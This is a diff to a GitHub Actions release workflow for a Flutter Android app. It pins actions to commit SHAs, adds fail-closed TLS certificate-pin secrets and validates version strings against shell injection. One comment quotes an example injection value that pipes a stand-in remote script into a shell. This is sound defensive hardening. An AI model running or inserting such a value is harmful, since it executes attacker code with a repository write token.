@@ -18,13 +18,18 @@ jobs:
   build:
     runs-on: ubuntu-24.04
     permissions:
+      # NOTE: `contents: write` is REQUIRED here — this job publishes the
+      # GitHub Release and the public mirror on `push: tags: v*`. It is
+      # over-broad for the pull_request/main path, where only analyze+test run.
+      # The real fix is splitting the tag-publish steps into their own job;
+      # left in place deliberately rather than breaking the release path.
       contents: write
     outputs:
       version: ${{ steps.version.outputs.version }}
 
     steps:
       - name: Checkout source
-        uses: actions/checkout@v4
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
 
       - name: Free disk space
         shell: bash
@@ -37,7 +42,7 @@ jobs:
           df -h /
 
       - name: Setup Java
-        uses: actions/setup-java@v4
+        uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
         with:
           distribution: temurin
           java-version: "17"
@@ -47,7 +52,7 @@ jobs:
         run: yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --licenses >/dev/null 2>&1 || true
 
       - name: Setup Flutter
-        uses: subosito/flutter-action@v2
+        uses: subosito/flutter-action@1a449444c387b1966244ae4d4f8c696479add0b2 # v2
         with:
           flutter-version: "3.44.6"
           cache: true
@@ -103,13 +108,48 @@ jobs:
           keyPassword=$SIGNING_KEY_PASSWORD
           EOF
 
-      - name: Build APK
+      # SECURITY: the cert pin baked into the release build. Supplied as a
+      # secret so the pin can be rotated without a code change; the backup
+      # slot covers the window where a cert swap has already happened but the
+      # released apps still carry the old pin. SslPinningConfig fails CLOSED
+      # when this is empty, so a release built without it cannot reach the API.
+      - name: Resolve TLS certificate pin
+        id: certpin
+        env:
+          CERT_PIN: ${{ secrets.ECARDO_CERT_PIN }}
+          CERT_PIN_BACKUP: ${{ secrets.ECARDO_CERT_PIN_BACKUP }}
         run: |
+          if [ -z "$CERT_PIN" ] && [ -z "$CERT_PIN_BACKUP" ]; then
+            echo "❌ Neither ECARDO_CERT_PIN nor ECARDO_CERT_PIN_BACKUP is set."
+            echo "   A release built without a pin is rejected at runtime by"
+            echo "   SslPinningConfig (fail-closed), so it would ship an app that"
+            echo "   cannot talk to ecardo.ir. Set at least one secret."
+            exit 1
+          fi
+          echo "pin=${CERT_PIN}" >> "$GITHUB_OUTPUT"
+          echo "pin_backup=${CERT_PIN_BACKUP}" >> "$GITHUB_OUTPUT"
+          echo "✅ certificate pin(s) present for release build"
+
+      - name: Build APK
+        env:
+          CERT_PIN: ${{ steps.certpin.outputs.pin }}
+          CERT_PIN_BACKUP: ${{ steps.certpin.outputs.pin_backup }}
+        run: |
+          set -o pipefail
+          PIN_ARGS=""
+          if [ -n "$CERT_PIN" ]; then
+            PIN_ARGS="--dart-define=ECARDO_CERT_PIN=$CERT_PIN"
+          fi
+          if [ -n "$CERT_PIN_BACKUP" ]; then
+            PIN_ARGS="$PIN_ARGS --dart-define=ECARDO_CERT_PIN_BACKUP=$CERT_PIN_BACKUP"
+          fi
           if [[ "$GITHUB_REF" == refs/tags/v* ]]; then
             flutter build apk --release --obfuscate --split-debug-info=build/symbols \
-              --target-platform android-arm64 --tree-shake-icons 2>&1 | tee build_log.txt
+              --target-platform android-arm64 --tree-shake-icons $PIN_ARGS 2>&1 | tee build_log.txt
             test -f build/app/outputs/flutter-apk/app-release.apk
           else
+            # Debug builds keep the default (unpinned) behaviour so local dev
+            # against a self-signed dev host still works; only releases are pinned.
             flutter build apk --debug 2>&1 | tee build_log.txt
             test -f build/app/outputs/flutter-apk/app-debug.apk
           fi
@@ -230,7 +270,7 @@ jobs:
       - name: Upload Debug Symbols
         if: always()
         continue-on-error: true
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
         with:
           name: debug-symbols-${{ github.sha }}
           if-no-files-found: ignore
@@ -240,7 +280,7 @@ jobs:
       - name: Upload Build Log
         if: always()
         continue-on-error: true
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
         with:
           name: build-log
           if-no-files-found: warn
@@ -263,15 +303,26 @@ jobs:
     permissions:
       contents: write
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
         with:
           fetch-depth: 0
 
       - name: Decide whether release is needed
         id: gate
+        env:
+          # SECURITY: never interpolate step outputs directly into a run: block.
+          # Values derived from pubspec.yaml are author-controlled; a value such
+          # as `$(curl evil.sh|sh)` would execute here with a contents:write token.
+          PUBSPEC_VERSION: ${{ needs.build.outputs.version }}
         run: |
           set -euo pipefail
-          VERSION="${{ needs.build.outputs.version }}"
+          VERSION="${PUBSPEC_VERSION:?no version from build job}"
+          # Reject anything that is not a bare dotted version before it is used
+          # in a git ref, a file name, or a JSON payload.
+          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "❌ Refusing malformed version from build job: '$VERSION'"
+            exit 1
+          fi
           TAG="v${VERSION}"
           echo "version=$VERSION" >> "$GITHUB_OUTPUT"
           echo "tag=$TAG" >> "$GITHUB_OUTPUT"
@@ -286,11 +337,14 @@ jobs:
       - name: Create annotated tag
         if: steps.gate.outputs.needed == 'true'
         env:
+          TAG: ${{ steps.gate.outputs.tag }}
           PAT: ${{ secrets.ECRDO_RELEASE_TOKEN }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set -euo pipefail
-          TAG="${{ steps.gate.outputs.tag }}"
+          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "❌ Refusing malformed tag: '$TAG'"; exit 1
+          fi
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git tag -a "$TAG" -m "userapp ${TAG} (release-if-untagged ${GITHUB_SHA::7})"
@@ -308,7 +362,7 @@ jobs:
 
       - name: Setup Java
         if: steps.gate.outputs.needed == 'true'
-        uses: actions/setup-java@v4
+        uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
         with:
           distribution: temurin
           java-version: "17"
@@ -319,7 +373,7 @@ jobs:
 
       - name: Setup Flutter
         if: steps.gate.outputs.needed == 'true'
-        uses: subosito/flutter-action@v2
+        uses: subosito/flutter-action@1a449444c387b1966244ae4d4f8c696479add0b2 # v2
         with:
           flutter-version: "3.44.6"
           cache: true
@@ -351,22 +405,43 @@ jobs:
 
       - name: Build signed release APK
         if: steps.gate.outputs.needed == 'true'
+        env:
+          CERT_PIN: ${{ secrets.ECARDO_CERT_PIN }}
+          CERT_PIN_BACKUP: ${{ secrets.ECARDO_CERT_PIN_BACKUP }}
         run: |
+          set -euo pipefail
+          set -o pipefail
+          if [ -z "$CERT_PIN" ] && [ -z "$CERT_PIN_BACKUP" ]; then
+            echo "❌ No certificate pin secret set — refusing to build a release"
+            echo "   that SslPinningConfig would reject at runtime. Set"
+            echo "   ECARDO_CERT_PIN (and preferably ECARDO_CERT_PIN_BACKUP)."
+            exit 1
+          fi
+          PIN_ARGS=""
+          if [ -n "$CERT_PIN" ]; then
+            PIN_ARGS="--dart-define=ECARDO_CERT_PIN=$CERT_PIN"
+          fi
+          if [ -n "$CERT_PIN_BACKUP" ]; then
+            PIN_ARGS="$PIN_ARGS --dart-define=ECARDO_CERT_PIN_BACKUP=$CERT_PIN_BACKUP"
+          fi
           flutter build apk --release --obfuscate --split-debug-info=build/symbols \
-            --target-platform android-arm64 --tree-shake-icons 2>&1 | tee build_log.txt
+            --target-platform android-arm64 --tree-shake-icons $PIN_ARGS 2>&1 | tee build_log.txt
           test -f build/app/outputs/flutter-apk/app-release.apk
           ls -lh build/app/outputs/flutter-apk/*.apk
 
       - name: Publish + mirror + notify
         if: steps.gate.outputs.needed == 'true'
         env:
+          VERSION: ${{ steps.gate.outputs.version }}
+          TAG: ${{ steps.gate.outputs.tag }}
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           ECRDO_RELEASE_TOKEN: ${{ secrets.ECRDO_RELEASE_TOKEN }}
           ECARDO_DEPLOY_SECRET: ${{ secrets.ECARDO_DEPLOY_SECRET }}
         run: |
           set -euo pipefail
-          VERSION="${{ steps.gate.outputs.version }}"
-          TAG="v${VERSION}"
+          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "❌ Refusing malformed version: '$VERSION'"; exit 1
+          fi
           APK_NAME="ecardo_user_v${VERSION}.apk"
           cp build/app/outputs/flutter-apk/app-release.apk "$APK_NAME"
 
